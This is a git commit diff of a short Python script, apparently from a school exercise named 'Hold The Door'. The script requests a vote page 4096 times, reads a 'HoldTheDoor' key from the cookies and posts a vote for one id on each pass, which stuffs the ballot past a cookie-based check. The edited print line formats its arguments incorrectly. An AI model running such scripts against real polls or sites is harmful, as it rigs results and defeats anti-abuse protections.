c320f5107efeb1605071fa06a5a78b0c63584900
Miguel22247 <nr2862002@gmail.com>
2021-05-31 16:58:15 -0300

    writed from scratch

--- level_1/level1.py
+++ level_1/level1.py
@@ -5,6 +5,7 @@
 import requests
 
 page = "http://158.69.76.135/level1.php/"
+
 for i in range (0, 4096):
 	get = requests.get(page)
 	cookies = get.cookies
@@ -12,4 +13,4 @@ for i in range (0, 4096):
 	key = dictionary.get('HoldTheDoor')
 	payloader = {'id': '2780', 'key': key, 'holdthedoor': 'Enviar'}
 	result = requests.post(page, data = payloader, cookies = cookies)
-	print("Vote n*{:d}")
+	print("Vote n*{:d} send it with code {}".format(i, result, key))
